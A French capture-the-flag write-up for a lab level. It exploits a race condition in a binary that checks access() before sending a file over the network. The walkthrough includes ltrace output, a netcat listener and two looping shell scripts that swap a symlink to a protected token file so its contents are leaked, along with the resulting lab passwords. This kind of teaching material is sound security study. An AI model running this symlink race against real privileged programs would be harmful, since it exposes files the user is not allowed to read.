On trouve dans le dossier home un file token et un binaire ./level10 qui, si on le lance nous affiche un message:
<pre><code>> ./level10
./level10 file host
		sends file to host if you have access to it

> ./level10 token 192.168.1.42
You don't have access to token
</code></pre>
> on suppose que l'host est l'ip sur laquelle la machine tourne (<code>ifconfig</code>)

On creer un fichier dans /tmp qui aura nos droits, et qui pourra donc être envoyé:
<pre><code>> echo "test" > /tmp/test
> ./level10 /tmp/test 192.168.1.42
Connecting to 192.168.1.42:6969 .. Unable to connect to host 192.168.1.42
</code></pre>

On cherche a savoir ce qu'il se passe dans le binaire avec un fichier valide:
<pre><code>> ltrace ./level10 /tmp/test 192.168.1.42
__libc_start_main(0x80486d4, 3, 0xbffff7c4, 0x8048970, 0x80489e0 <unfinished ...>
access("/tmp/test", 4)= 0
printf("Connecting to %s:6969 .. ", "192.168.1.42")= 35
fflush(0xb7fd1a20Connecting to 192.168.1.42:6969 .. )= 0
socket(2, 1, 0)= 3
inet_addr("192.168.1.42")= 0x2a01a8c0
htons(6969, 1, 0, 0, 0)= 14619
connect(3, 0xbffff70c, 16, 0, 0)= -1
printf("Unable to connect to host %s\n", "192.168.1.42"Unable to connect to host 192.168.1.42)= 39
exit(1 <unfinished ...>
+++ exited (status 1) +++
</code></pre>

On observe que la commande **access** est utilisée, or on sait grâce a son man, que cette commande possède une faille
<pre>
Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and  opening  the file to manipulate it.
</pre>
> Cette faille se nomme la **race-condition-vulnerability**.

De plus on abserve la tentative de connexion au port 6969 qui n'est pas actif.
Pour que les requetes ce fassent, il faut donc ecouter le port grâce a :
<pre><code>> nc -lk 6969</code></pre>
Et si on relance notre commande:
<pre><code>> ./level10 /tmp/test 192.168.1.42
Connecting to 192.168.1.42:6969 .. Connected!
Sending file .. wrote file!</code></pre>
> Il faut 2 terminaux pour efftuer cette manipulation afin de voir le resultat de l'écoute qui dans cette exemple nous donne :
> <pre><code>.*( )*.
> test</code></pre>


On va donc chercher a exploiter la **race-condition-vulnerability**, avec 2 scripts:

### /tmp/loop.sh
```bash
# Ce script lance la requete d'envoie de fichier en boucle
while true;
do
	/home/user/level10/level10 /tmp/link 192.168.1.42 > /dev/null
done
```
> <code>printf "while true;\ndo\n\t/home/user/level10/level10 /tmp/link 192.168.1.42 > /dev/null\ndone\n" > /tmp/loop.sh</code>

### /tmp/ln.sh
```bash
# Ce script creer un fichier sur lequel on a les droits et fait un lien symbolique du fichier token en boucle
while true;
do
	rm -f /tmp/link
	touch /tmp/link
	rm -f /tmp/link
	ln -s /home/user/level10/token /tmp/link
done
```
> <code>printf "while true;\ndo\n\trm -f /tmp/link\n\ttouch /tmp/link\n\trm -f /tmp/link\n\tln -s /home/user/level10/token /tmp/link\ndone\n" > /tmp/ln.sh</code>

Il suffit de lancer les deux en background et de regarder le deuxieme terminal qui ecoute le port 6969 en attendant les deux scripts s'execute de maniere assez proche pour que la **race-condition-vulnerability** soit exploitée :
<pre><code>> sh /tmp/loop.sh &
> sh /tmp/ln.sh &
</code></pre>
On obtient donc: 
<pre><code>...
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
...
</code></pre>

On test le mot de passe :
<pre>
<code>> su flag10</code>
<code>Password: woupa2yuojeeaaed06riuj63c</code>
</pre>

On obtient la phrase magique **Don't forget to launch getflag !**

<pre>
<code>> getflag</code>
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
</pre>